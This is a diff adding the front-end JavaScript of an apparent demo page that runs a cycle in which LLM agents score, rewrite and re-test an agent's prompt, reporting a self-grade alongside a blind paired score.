+  document.getElementById('after-hdr').textContent = `AFTER: ${weakestAgentName} v${cycleNum + 1}`;
+
+  // Populate diff
+  const beforeBody = document.getElementById('before-body');
+  const afterBody = document.getElementById('after-body');
+  beforeBody.innerHTML = '';
+  afterBody.innerHTML = '';
+
+  const { origAnnotated, refAnnotated } = diffLines(original, refined);
+  origAnnotated.forEach(l => {
+    const span = document.createElement('span');
+    span.className = 'diff-line' + (l.removed ? ' removed' : '');
+    span.textContent = l.text || ' ';
+    beforeBody.appendChild(span);
+    beforeBody.appendChild(document.createElement('br'));
+  });
+  refAnnotated.forEach(l => {
+    const span = document.createElement('span');
+    span.className = 'diff-line' + (l.added ? ' added' : '');
+    span.textContent = l.text || ' ';
+    afterBody.appendChild(span);
+    afterBody.appendChild(document.createElement('br'));
+  });
+
+  // Cascade manifest cards
+  const cards = document.getElementById('manifest-cards');
+  cards.innerHTML = '';
+  document.getElementById('sculptor-analyzing').style.display = 'none';
+
+  for (let i = 0; i < manifest.length; i++) {
+    await new Promise(r => setTimeout(r, 350));
+    const m = manifest[i];
+    const card = document.createElement('div');
+    card.className = 'manifest-card';
+    const badgeCls = { ADDED: 'badge-added', REMOVED: 'badge-removed', TIGHTENED: 'badge-tightened', CLARIFIED: 'badge-clarified' }[m.type] || 'badge-clarified';
+    card.innerHTML = `<div class="manifest-badge ${badgeCls}">${m.type}</div><div style="font-size:10.5px;color:var(--wht);line-height:1.6">${m.text}</div>`;
+    cards.appendChild(card);
+    await new Promise(r => setTimeout(r, 50));
+    card.classList.add('visible');
+  }
+
+  if (manifest.length === 0) {
+    const card = document.createElement('div');
+    card.className = 'manifest-card visible';
+    card.innerHTML = '<div style="color:var(--gr);font-size:11px">No change manifest parsed — check SCULPTOR output.</div>';
+    cards.appendChild(card);
+  }
+}
+
+async function animateRerun(text, before, after, verdict, preStreamedBody) {
+  const beforeTerm = document.getElementById('rerun-before-term');
+  const afterTerm = document.getElementById('rerun-after-term');
+
+  // Before: show original exercise excerpt for weakest agent
+  const origExcerpt = exerciseTranscript.split('\n').slice(0, 25).join('\n') + '\n\n[Original score: ' + fmtScore(before) + ']';
+  const bHdr = document.createElement('div');
+  bHdr.className = 'te-hdr amber';
+  bHdr.textContent = `${weakestAgentName} — ORIGINAL`;
+  const bBody = document.createElement('div');
+  bBody.className = 'te-body amber';
+  bBody.textContent = origExcerpt;
+  beforeTerm.appendChild(bHdr);
+  beforeTerm.appendChild(bBody);
+
+  // After: typewriter animate rerun output unless the body was already
+  // streamed live during the fetch (LIVE+CC path).
+  if (!preStreamedBody) {
+    const aHdr = document.createElement('div');
+    aHdr.className = 'te-hdr';
+    aHdr.style.color = 'var(--grn)';
+    aHdr.textContent = `${weakestAgentName} — REFINED`;
+    const aBody = document.createElement('div');
+    aBody.className = 'te-body';
+    aBody.style.borderLeftColor = 'rgba(0,240,144,.4)';
+    aBody.style.color = '#b0f0c0';
+    afterTerm.appendChild(aHdr);
+    afterTerm.appendChild(aBody);
+    await twEl(aBody, text);
+  }
+
+  // Score bars
+  document.getElementById('rerun-bottom').style.display = 'block';
+  const barsEl = document.getElementById('score-bars');
+  // W1: the AFTER row is coloured by the measured direction, not assumed to
+  // be an improvement. An unparsed score shows no bar and no delta.
+  const measured = !isUnscored(before) && !isUnscored(after);
+  const dir = measured ? after - before : null;
+  const afterValCls = !measured ? 'score-lo' : dir > 0 ? 'score-hi' : dir < 0 ? 'score-lo' : 'score-mid';
+  const afterFillCls = measured && dir < 0 ? 'before' : 'after';
+  const deltaCol = !measured ? 'var(--red)' : dir > 0 ? 'var(--grn)' : dir < 0 ? 'var(--red)' : 'var(--amb)';
+  barsEl.innerHTML = `
+    <div class="score-bar-row">
+      <span class="score-bar-label">BEFORE (original)</span>
+      <div class="score-bar-track"><div class="score-bar-fill before" style="width:${scoreBarPct(before)}%"></div></div>
+      <span class="score-bar-val score-mid">${fmtScore(before)}</span>
+      <span class="delta-val"></span>
+    </div>
+    <div class="score-bar-row">
+      <span class="score-bar-label">AFTER (refined)</span>
+      <div class="score-bar-track"><div class="score-bar-fill ${afterFillCls}" style="width:${scoreBarPct(after)}%"></div></div>
+      <span class="score-bar-val ${afterValCls}">${fmtScore(after)}</span>
+      <span class="delta-val" style="color:${deltaCol};width:auto">${fmtDelta(before, after)}</span>
+    </div>`;
+
+  const verdictEl = document.getElementById('verdict-box');
+  const vCls = verdict === 'IMPROVED' ? 'verdict-improved' : (verdict === 'REGRESSION' || verdict === 'UNPARSED') ? 'verdict-regression' : 'verdict-marginal';
+  const vTxt = verdict === 'UNPARSED' ? 'UNPARSED — verifier output could not be scored' : verdict;
+  verdictEl.innerHTML = `<div class="verdict-text ${vCls}">⚛ ${vTxt}</div>`;
+}
+
+// ─── Main cycle ───
+function showErrorRecovery() {
+  const b = document.getElementById('error-recovery-banner');
+  if (!b) return;
+  b.style.display = 'flex';
+  document.getElementById('err-retry-btn').onclick = function() { hideErrorRecovery(); runImprovementCycle(); };
+  document.getElementById('err-demo-btn').onclick = function() { hideErrorRecovery(); if (!demoMode) toggleDemo(); runImprovementCycle(); };
+  document.getElementById('err-dismiss-btn').onclick = hideErrorRecovery;
+}
+function hideErrorRecovery() { const b = document.getElementById('error-recovery-banner'); if (b) b.style.display = 'none'; }
+
+async function runImprovementCycle() {
+  if (evolveRunning) return;
+  if (!evolveMode) { document.getElementById('binfo').textContent = '[FAULT: Select a mode first]'; return; }
+
+  // Block custom mode runs with no populated slots.
+  // Without this, CHALLENGER fabricates a swarm from nothing — convincing
+  // enough that an attendee may mistake hallucinated content for canonical
+  // canonical behavior. Demo-mode bypasses (the canned populator fills slots).
+  if (evolveMode === 'custom' && !demoMode) {
+    let hasSlot = false;
+    for (let i = 1; i <= 3; i++) {
+      const n = document.getElementById(`a${i}-name`)?.value.trim();
+      const p = document.getElementById(`a${i}-prompt`)?.value.trim();
+      if (n && p) { hasSlot = true; break; }
+    }
+    if (!hasSlot) {
+      document.getElementById('binfo').textContent = '[FAULT: Fill at least one agent slot (name + prompt) before running]';
+      return;
+    }
+  }
+
+  evolveRunning = true;
+  // Snapshot mode/preset so dlEvolveTranscript reads the
+  // run state, not post-run UI drift.
+  runMode = evolveMode;
+  runPreset = evolvePreset;
+
+  const ak = document.getElementById('eak').value.trim();
+  if (!demoMode && evolveProvider !== 'cc' && evolveProvider !== 'ollama' && !ak) { const go = confirm('No API key configured. Switch to DEMO MODE to run without a key, or cancel and enter a key first. Proceed anyway?'); if (!go) { evolveRunning = false; return; } }
+
+  hideTokens();
+  document.getElementById('run-btn').disabled = true;
+  document.getElementById('run-btn').textContent = '[ RUNNING... ]';
+  document.getElementById('export-panel').classList.remove('show');
+
+  try {
+    // Phase 2: Exercise
+    setPhase(2);
+    document.getElementById('binfo').textContent = 'Phase 2: Running exercise...';
+
+    if (evolveMode === 'custom') {
+      let challengerOut;
+      if (demoMode) {
+        await new Promise(r => setTimeout(r, 800));
+        challengerOut = gx('de-challenger-custom');
+      } else {
+        try {
+          challengerOut = await evolveCallAPI(SYS_CHALLENGER, budget(buildChallengerPrompt(), 1500), ak);
+        } catch (e) {
+          challengerOut = `[FAULT: CHALLENGER — ${e.message}]`;
+        }
+      }
+      await animateCustomExercise(challengerOut);
+    } else if (evolveMode === 'import') {
+      await animateChainedExercise();
+    } else {
+      await animatePresetExercise();
+    }
+
+    await waitStep('ARBITER — Performance Analysis');
+
+    // Phase 3: Arbiter
+    setPhase(3);
+    document.getElementById('binfo').textContent = 'Phase 3: ARBITER scoring performance...';
+
+    const arbKey = scriptKeyFor('arbiter');
+    {
+      const arbContent = document.getElementById('arbiter-content');
+      arbContent.textContent = '';
+      arbiterOutput = await callWithRecovery('ARBITER',
+        opts => streamPhaseText(arbContent, SYS_ARBITER, budget(buildArbiterPrompt(), 1500), ak,
+          async () => { await new Promise(r => setTimeout(r, 700)); return gx(arbKey) || gx('de-arbiter-red'); }, opts),
+        arbContent);
+    }
+    await animateArbiter(arbiterOutput);
+    const parsed = parseArbiterOutput(arbiterOutput);
+    // W1: neither fallback below may quietly stand in for a measurement.
+    if (!parsed.weakestAgent) console.warn('[evolve] PARSE FAILURE: ARBITER output has no `Weakest Agent: NAME` line. Falling back to DETECTION-ENGINEER so the cycle can continue — the target was NOT selected by the scorer.');
+    weakestAgentName = parsed.weakestAgent || 'DETECTION-ENGINEER';
+    weakestAgentOriginalPrompt = getAgentPrompt(weakestAgentName);
+    if (isUnscored(parsed.aggregate)) console.warn('[evolve] PARSE FAILURE: ARBITER output has no `Aggregate Score: N/10` line. score_before = UNPARSED (not estimated).');
+    scoreBefore = isUnscored(parsed.aggregate) ? null : parsed.aggregate;
+
+    await waitStep('SCULPTOR — Prompt Refinement');
+
+    // Phase 4: Sculptor
+    setPhase(4);
+    document.getElementById('binfo').textContent = `Phase 4: SCULPTOR refining ${weakestAgentName}...`;
+    document.getElementById('sculptor-analyzing').style.display = 'block';
+    document.getElementById('analyzing-label').textContent = parsed.weaknessClass || 'detection_gap';
+
+    const sculKey = scriptKeyFor('sculptor');
+    {
+      // Inject a transient streaming pane inside manifest-area so the
+      // operator sees SCULPTOR writing its refinement in real time. The
+      // pane is removed once animateSculptor() takes over with the
+      // structured diff/manifest view.
+      const manifestArea = document.getElementById('manifest-area');
+      let streamPane = document.getElementById('sculptor-stream-pane');
+      if (!streamPane) {
+        streamPane = document.createElement('div');
+        streamPane.id = 'sculptor-stream-pane';
+        streamPane.style.cssText = 'font-family:monospace;font-size:10px;color:var(--amb);white-space:pre-wrap;padding:8px;border:1px dashed rgba(255,180,0,.3);max-height:240px;overflow-y:auto;margin-bottom:6px';
+        manifestArea.insertBefore(streamPane, document.getElementById('manifest-cards'));
+      }
+      sculptorOutput = await callWithRecovery('SCULPTOR',
+        opts => streamPhaseText(streamPane, SYS_SCULPTOR, budget(buildSculptorPrompt(weakestAgentName, weakestAgentOriginalPrompt, arbiterOutput), 2000), ak,
+          async () => { await new Promise(r => setTimeout(r, 900)); return gx(sculKey) || gx('de-sculptor-red'); }, opts),
+        streamPane);
+      streamPane.remove();
+    }
+
+    const { refined, manifest } = parseSculptorOutput(sculptorOutput);
+    refinedPrompt = refined || sculptorOutput;
+    changeManifest = manifest;
+
+    await animateSculptor(weakestAgentOriginalPrompt, refinedPrompt, changeManifest);
+
+    await waitStep('RERUN — Post-Refinement Verification');
+
+    // Phase 5: Rerun
+    setPhase(5);
+    document.getElementById('binfo').textContent = 'Phase 5: RERUN scoring the refined agent...';
+
+    const rerunKey = scriptKeyFor('rerun');
+    let preStreamedBody = false;
+    {
+      // Pre-build the after-pane so RERUN can stream tokens into the
+      // refined-output body during the LIVE+CC fetch. animateRerun() will
+      // skip re-typing the after-body when this happens.
+      const afterTerm = document.getElementById('rerun-after-term');
+      const aHdr = document.createElement('div');
+      aHdr.className = 'te-hdr';
+      aHdr.style.color = 'var(--grn)';
+      aHdr.textContent = `${weakestAgentName} — REFINED`;
+      const aBody = document.createElement('div');
+      aBody.className = 'te-body';
+      aBody.style.borderLeftColor = 'rgba(0,240,144,.4)';
+      aBody.style.color = '#b0f0c0';
+      afterTerm.appendChild(aHdr);
+      afterTerm.appendChild(aBody);
+      try {
+        rerunOutput = await callWithRecovery('RERUN',
+          opts => streamPhaseText(aBody, SYS_RERUN, budget(buildRerunPrompt(weakestAgentName, refinedPrompt, exerciseTranscript, scoreBefore), 1500), ak,
+            async () => { await new Promise(r => setTimeout(r, 800)); return gx(rerunKey) || gx('de-rerun-red'); }, opts),
+          aBody);
+        preStreamedBody = true;
+      } catch (e) {
+        // Operator chose Abort — roll back the pre-built after-pane so
+        // animateRerun renders the fault inside its own consistent layout.
+        rerunOutput = `[FAULT: RERUN — ${e.message}]`;
+        aHdr.remove(); aBody.remove();
+      }
+    }
+
+    const rerunParsed = parseRerunOutput(rerunOutput);
+    scoreAfter = rerunParsed.scoreAfter;
+    // W1: RERUN restates the baseline in its own delta table AND scores the
+    // revised output. When its restated baseline disagrees with the scorer's,
+    // the delta it reports is measured against a number nothing else in the
+    // run produced. Not a parse failure, but not a clean measurement either.
+    if (!isUnscored(scoreBefore) && !isUnscored(rerunParsed.scoreBefore)
+        && Math.abs(rerunParsed.scoreBefore - scoreBefore) > 0.05) {
+      console.warn(`[evolve] BASELINE DISAGREEMENT: scorer put the original aggregate at ${scoreBefore}/10, verifier restated it as ${rerunParsed.scoreBefore}/10 in its own delta table. Delta shown is measured against the scorer's baseline.`);
+    }
+
+    await animateRerun(rerunOutput, scoreBefore, scoreAfter, rerunParsed.verdict, preStreamedBody);
+
+    // W4 — the measurement. The replay above graded its own output; this does not.
+    blindResult = null;
+    if (demoMode) {
+      renderBlindBox(null);
+    } else {
+      document.getElementById('binfo').textContent = 'Phase 5: BLIND PAIRED SCORE — scoring both stage outputs blind...';
+      blindResult = await runBlindPairedScore(ak);
+      renderBlindBox(blindResult);
+      // The two can disagree. That IS a result, and it is said out loud rather
+      // than quietly resolved in favour of one of them.
+      if (blindResult && !blindResult.notRun
+          && !isUnscored(scoreBefore) && !isUnscored(scoreAfter)
+          && !isUnscored(blindResult.originalScore) && !isUnscored(blindResult.revisedScore)) {
+        const sd = Math.sign(scoreAfter - scoreBefore);
+        const bd = Math.sign(blindResult.revisedScore - blindResult.originalScore);
+        if (sd !== bd) console.warn(`[evolve] MEASUREMENT DISAGREEMENT: the self-grade reports ${fmtDelta(scoreBefore, scoreAfter)} and the blind paired score reports ${fmtDelta(blindResult.originalScore, blindResult.revisedScore)}. The blind paired score is the measurement; both are reported.`);
+      }
+    }
+
+    // Show export panel
+    document.getElementById('export-panel').classList.add('show');
+    const blindTxt = (blindResult && !blindResult.notRun)
+      ? `blind paired delta ${fmtDelta(blindResult.originalScore, blindResult.revisedScore)}`
+      : (demoMode ? 'blind paired score not run in recorded mode' : 'blind paired score UNPARSED');
+    document.getElementById('binfo').textContent = `Cycle ${cycleNum} complete. ${weakestAgentName} — ${blindTxt}. Self-grade: ${rerunParsed.verdict} ${fmtScore(scoreBefore)} → ${fmtScore(scoreAfter)} (${fmtDelta(scoreBefore, scoreAfter)}).`;
+
+  } catch (err) {
+    document.getElementById('binfo').textContent = `[FAULT: ${err.message}]`;
+    showErrorRecovery();
+  } finally {
+    evolveRunning = false;
+    document.getElementById('run-btn').disabled = false;
+    document.getElementById('run-btn').textContent = '[ ⚛ RUN CYCLE ]';
+  }
+}
+
+async function runAnotherCycle() {
+  cycleNum++;
+  document.getElementById('cycle-counter').textContent = `CYCLE ${cycleNum} / ∞`;
+
+  // Update agent prompt to refined version
+  if (evolveMode === 'preset') {
+    AGENT_PROMPTS[weakestAgentName] = refinedPrompt;
+  }
+
+  // Reset phase 5 display
+  document.getElementById('rerun-before-term').innerHTML = '';
+  document.getElementById('rerun-after-term').innerHTML = '';
+  document.getElementById('rerun-bottom').style.display = 'none';
+  document.getElementById('verdict-box').innerHTML = '';
+  document.getElementById('score-bars').innerHTML = '';
+  document.getElementById('arbiter-content').textContent = '';
+  document.getElementById('manifest-cards').innerHTML = '';
+  document.getElementById('before-body').innerHTML = '';
+  document.getElementById('after-body').innerHTML = '';
+  document.getElementById('export-panel').classList.remove('show');
+
+  arbiterOutput = '';
+  sculptorOutput = '';
+  rerunOutput = '';
+
+  await runImprovementCycle();
+}
+
+function resetEvolve() {
+  evolveMode = null;
+  evolvePreset = 'red';
+  runMode = null;
+  runPreset = null;
+  cycleNum = 1;
+  evolveRunning = false;
+  exerciseTranscript = '';
+  arbiterOutput = '';
+  sculptorOutput = '';
+  rerunOutput = '';
+  weakestAgentName = '';
+  weakestAgentOriginalPrompt = '';
+  refinedPrompt = '';
+  changeManifest = [];
+  scoreBefore = null;
+  scoreAfter = null;
+  blindResult = null;
+
+  document.getElementById('cycle-counter').textContent = 'CYCLE 1 / ∞';
+  document.getElementById('run-btn').disabled = true;
+  document.getElementById('run-btn').textContent = '[ ⚛ RUN CYCLE ]';
+  document.getElementById('binfo').textContent = 'Select a mode to begin the self-refinement loop.';
+  document.getElementById('export-panel').classList.remove('show');
+
+  // Reset rerun panel
+  document.getElementById('rerun-before-term').innerHTML = '';
+  document.getElementById('rerun-after-term').innerHTML = '';
+  document.getElementById('rerun-bottom').style.display = 'none';
+  document.getElementById('verdict-box').innerHTML = '';
+  document.getElementById('score-bars').innerHTML = '';
+
+  // Reset arbiter
+  document.getElementById('arbiter-content').textContent = '';
+
+  // Reset sculptor
+  document.getElementById('manifest-cards').innerHTML = '';
+  document.getElementById('before-body').innerHTML = '';
+  document.getElementById('after-body').innerHTML = '';
+
+  setPhase(0);
+}
+
+// ─── Init ───
+function initEvolve() {
+  // Check for imported data and style the import button
+  const imported = loadEvolveSource();
+  const importBtn = document.getElementById('import-mode-btn');
+  if (imported) {
+    importBtn.classList.add('import-ready');
+  } else {
+    importBtn.classList.add('import-dim');
+  }
+
+  setEvolveProvider(evolveProvider, true);
+
+  document.getElementById('eak').addEventListener('input', e => {
+    localStorage.setItem('swarmdemo_loop_key', e.target.value);
+  });
+  document.getElementById('e-ollama-model')?.addEventListener('input', e => {
+    localStorage.setItem('swarmdemo_ollama_model', e.target.value);
+  });
+
+  setPhase(0);
+}
+
+initEvolve();
+
+// A7: Space bar advances STEP MODE gate
+document.addEventListener('keydown', function(e) { if (e.code === 'Space' && e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') { const gates = document.querySelectorAll('.step-btn:not([style*="display:none"])'); if (gates.length) { e.preventDefault(); gates[0].click(); } } });
+// A8: Ctrl+D toggles DEMO MODE
+document.addEventListener('keydown', function(e) { if (e.ctrlKey && e.key === 'd') { e.preventDefault(); toggleDemo(); } });
+document.addEventListener('keydown', function(e) { if (e.ctrlKey && e.key === 'p') { e.preventDefault(); document.body.classList.toggle('pmode'); } });
+</script>
+</body>
+</html>
